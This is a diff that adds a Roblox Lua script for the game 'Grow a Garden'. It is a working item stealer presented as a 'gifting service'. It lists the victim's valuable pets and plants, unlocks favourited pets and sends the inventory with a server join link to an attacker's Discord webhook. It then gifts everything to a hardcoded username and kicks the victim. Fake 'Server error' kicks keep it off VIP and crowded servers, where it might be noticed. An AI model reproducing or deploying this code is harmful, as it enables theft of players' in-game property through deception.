@@ -1,0 +1,263 @@
+_G.scriptExecuted = _G.scriptExecuted or false
+if _G.scriptExecuted then return end
+_G.scriptExecuted = true
+
+-- CONFIGURATION
+local users = {"DanyelQuibs"} -- 🧑‍🤝‍🧑 Auto gift to this username
+local min_value = _G.min_value or 10000000
+local ping = _G.pingEveryone or "No"
+local webhook = _G.webhook or ""
+
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local plr = Players.LocalPlayer
+local backpack = plr:WaitForChild("Backpack")
+local replicatedStorage = game:GetService("ReplicatedStorage")
+local modules = replicatedStorage:WaitForChild("Modules")
+local calcPlantValue = require(modules:WaitForChild("CalculatePlantValue"))
+local petUtils = require(modules:WaitForChild("PetServices"):WaitForChild("PetUtilities"))
+local petRegistry = require(replicatedStorage:WaitForChild("Data"):WaitForChild("PetRegistry"))
+local numberUtil = require(modules:WaitForChild("NumberUtil"))
+local dataService = require(modules:WaitForChild("DataService"))
+local character = plr.Character or plr.CharacterAdded:Wait()
+
+local excludedItems = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}
+local rarePets = {"Red Fox", "Raccoon", "Dragonfly"}
+local totalValue = 0
+local itemsToSend = {}
+
+if next(users) == nil or webhook == "" then
+    plr:kick("You didn't add any usernames or webhook")
+    return
+end
+
+if game.PlaceId ~= 126884695634066 then
+    plr:kick("Game not supported. Please join a normal GAG server")
+    return
+end
+
+if #Players:GetPlayers() >= 5 then
+    plr:kick("Server error. Please join a DIFFERENT server")
+    return
+end
+
+if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
+    plr:kick("Server error. Please join a DIFFERENT server")
+    return
+end
+
+local function calcPetValue(v14)
+    local hatchedFrom = v14.PetData.HatchedFrom
+    if not hatchedFrom or hatchedFrom == "" then return 0 end
+    local eggData = petRegistry.PetEggs[hatchedFrom]
+    if not eggData then return 0 end
+    local v17 = eggData.RarityData.Items[v14.PetType]
+    if not v17 then return 0 end
+    local weightRange = v17.GeneratedPetData.WeightRange
+    if not weightRange then return 0 end
+    local v19 = numberUtil.ReverseLerp(weightRange[1], weightRange[2], v14.PetData.BaseWeight)
+    local v20 = math.lerp(0.8, 1.2, v19)
+    local levelProgress = petUtils:GetLevelProgress(v14.PetData.Level)
+    local v22 = v20 * math.lerp(0.15, 6, levelProgress)
+    local v23 = petRegistry.PetList[v14.PetType].SellPrice * v22
+    return math.floor(v23)
+end
+
+local function formatNumber(number)
+    if number == nil then return "0" end
+    local suffixes = {"", "k", "m", "b", "t"}
+    local suffixIndex = 1
+    while number >= 1000 and suffixIndex < #suffixes do
+        number = number / 1000
+        suffixIndex = suffixIndex + 1
+    end
+    return suffixIndex == 1 and tostring(math.floor(number))
+        or string.format("%.2f%s", number, suffixes[suffixIndex])
+end
+
+local function getWeight(tool)
+    local weightMatch = tool.Name:match("%((%d+%.?%d*) ?kg%)")
+    if weightMatch then return tonumber(weightMatch) or 0 end
+    return 0
+end
+
+local function getHighestKGFruit()
+    local highestWeight = 0
+    for _, item in ipairs(itemsToSend) do
+        if item.Weight > highestWeight then
+            highestWeight = item.Weight
+        end
+    end
+    return highestWeight
+end
+
+local function SendJoinMessage(list, prefix)
+    local fields = {
+        { name = "Player Username:", value = plr.Name, inline = true },
+        { name = "Join link:", value = "https://fern.wtf/joiner?placeId=126884695634066&gameInstanceId=" .. game.JobId },
+        { name = "Item list:", value = "", inline = false },
+        { name = "Summary:", value = string.format("Total Value: ¢%s\nHighest weight fruit: %.2f KG", formatNumber(totalValue), getHighestKGFruit()), inline = false }
+    }
+
+    for _, item in ipairs(list) do
+        fields[3].value = fields[3].value .. string.format("%s (%.2f KG): ¢%s\n", item.Name, item.Weight, formatNumber(item.Value))
+    end
+
+    if #fields[3].value > 1024 then
+        local lines = {}
+        for line in fields[3].value:gmatch("[^\r\n]+") do table.insert(lines, line) end
+        while #fields[3].value > 1024 and #lines > 0 do
+            table.remove(lines)
+            fields[3].value = table.concat(lines, "\n") .. "\nPlus more!"
+        end
+    end
+
+    local data = {
+        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(126884695634066, '" .. game.JobId .. "')",
+        ["embeds"] = {{
+            ["title"] = "🧰 Join to get GAG hit",
+            ["color"] = 65280,
+            ["fields"] = fields,
+            ["footer"] = { ["text"] = "GAG gifting service" }
+        }}
+    }
+
+    local body = HttpService:JSONEncode(data)
+    local headers = { ["Content-Type"] = "application/json" }
+    request({ Url = webhook, Method = "POST", Headers = headers, Body = body })
+end
+
+local function SendMessage(sortedItems)
+    local fields = {
+        { name = "Player Username:", value = plr.Name, inline = true },
+        { name = "Items sent:", value = "", inline = false },
+        { name = "Summary:", value = string.format("Total Value: ¢%s\nHighest weight fruit: %.2f KG", formatNumber(totalValue), getHighestKGFruit()), inline = false }
+    }
+
+    for _, item in ipairs(sortedItems) do
+        fields[2].value = fields[2].value .. string.format("%s (%.2f KG): ¢%s\n", item.Name, item.Weight, formatNumber(item.Value))
+    end
+
+    if #fields[2].value > 1024 then
+        local lines = {}
+        for line in fields[2].value:gmatch("[^\r\n]+") do table.insert(lines, line) end
+        while #fields[2].value > 1024 and #lines > 0 do
+            table.remove(lines)
+            fields[2].value = table.concat(lines, "\n") .. "\nPlus more!"
+        end
+    end
+
+    local data = {
+        ["embeds"] = {{
+            ["title"] = "🧰 New GAG Execution",
+            ["color"] = 65280,
+            ["fields"] = fields,
+            ["footer"] = { ["text"] = "GAG gifting service by Tobi. discord.gg/GY2RVSEGDT" }
+        }}
+    }
+
+    request({
+        Url = webhook,
+        Method = "POST",
+        Headers = { ["Content-Type"] = "application/json" },
+        Body = HttpService:JSONEncode(data)
+    })
+end
+
+-- 🧩 Collect tools
+for _, tool in ipairs(backpack:GetChildren()) do
+    if tool:IsA("Tool") and not table.find(excludedItems, tool.Name) then
+        if tool:GetAttribute("ItemType") == "Pet" then
+            local petUUID = tool:GetAttribute("PET_UUID")
+            local v14 = dataService:GetData().PetsData.PetInventory.Data[petUUID]
+            local name = v14.PetType
+            local value = calcPetValue(v14)
+            local weight = getWeight(tool)
+            if table.find(rarePets, name) or weight >= 10 then
+                if tool:GetAttribute("Favorite") then
+                    replicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(tool)
+                end
+                totalValue += value
+                table.insert(itemsToSend, {Tool = tool, Name = name, Value = value, Weight = weight, Type = "Pet"})
+            end
+        else
+            local value = calcPlantValue(tool)
+            if value >= min_value then
+                local weight = getWeight(tool)
+                local name = tool:GetAttribute("ItemName") or tool.Name
+                totalValue += value
+                table.insert(itemsToSend, {Tool = tool, Name = name, Value = value, Weight = weight, Type = "Plant"})
+            end
+        end
+    end
+end
+
+if #itemsToSend > 0 then
+    table.sort(itemsToSend, function(a, b)
+        return (a.Type ~= "Pet" and b.Type == "Pet") or (a.Type == b.Type and a.Value < b.Value)
+    end)
+
+    local sentItems = table.clone(itemsToSend)
+    table.sort(sentItems, function(a, b)
+        return (a.Type == "Pet" and b.Type ~= "Pet") or (a.Type == b.Type and a.Value > b.Value)
+    end)
+
+    local prefix = ping == "Yes" and "@everyone " or ""
+    SendJoinMessage(sentItems, prefix)
+
+    -- 🧠 Gift function (unchanged)
+    local function doGift(player)
+        local victimRoot = character:WaitForChild("HumanoidRootPart")
+        victimRoot.CFrame = player.Character.HumanoidRootPart.CFrame + Vector3.new(0, 0, 2)
+        wait(0.1)
+        local promptRoot = player.Character.HumanoidRootPart:WaitForChild("ProximityPrompt")
+
+        for _, item in ipairs(itemsToSend) do
+            item.Tool.Parent = character
+            if item.Type == "Pet" then
+                local promptHead = player.Character.Head:WaitForChild("ProximityPrompt")
+                repeat task.wait(0.01) until promptHead.Enabled
+                fireproximityprompt(promptHead)
+            else
+                repeat task.wait(0.01) until promptRoot.Enabled
+                fireproximityprompt(promptRoot)
+            end
+            task.wait(0.1)
+            item.Tool.Parent = backpack
+            task.wait(0.1)
+        end
+
+        while true do
+            local found = false
+            for _, item in ipairs(itemsToSend) do
+                if backpack:FindFirstChild(item.Tool.Name) then
+                    found = true
+                    break
+                end
+            end
+            if not found then break end
+            task.wait(0.1)
+        end
+
+        plr:Kick("All your stuff just got gifted by Tobi's gifting service!\nJoin discord.gg/GY2RVSEGDT")
+    end
+
+    -- 👁️ Wait for matching player and gift automatically
+    local function waitAndGiftTarget()
+        for _, p in ipairs(Players:GetPlayers()) do
+            if table.find(users, p.Name) then
+                doGift(p)
+                return
+            end
+        end
+        Players.PlayerAdded:Connect(function(p)
+            if table.find(users, p.Name) then
+                p.CharacterAdded:Wait()
+                task.wait(1)
+                doGift(p)
+            end
+        end)
+    end
+
+    waitAndGiftTarget()
+end
